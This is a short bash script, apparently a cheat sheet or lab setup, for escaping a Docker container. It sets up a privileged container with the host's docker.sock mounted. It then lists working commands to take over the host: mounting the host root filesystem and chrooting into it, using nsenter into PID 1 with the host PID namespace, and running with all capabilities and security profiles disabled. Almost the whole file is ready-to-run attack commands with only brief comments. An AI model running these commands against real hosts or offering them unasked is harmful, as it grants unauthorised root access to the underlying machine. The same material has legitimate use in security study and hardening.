#!/bin/bash

### OUTSITE: DOCKER SOCK MOUNTED CONTAINER ###
sudo docker run -d -it --entrypoint=/bin/sh --privileged -v /var/run/docker.sock:/var/run/docker.sock docker:23.0.4-dind

### INSIDE ####
#Search the socket
find / -name docker.sock 2>/dev/null
#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash

# Get full access to the host via ns pid and nsenter cli
docker run -it --rm --pid=host --privileged ubuntu bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Get full privs in container without --privileged
docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash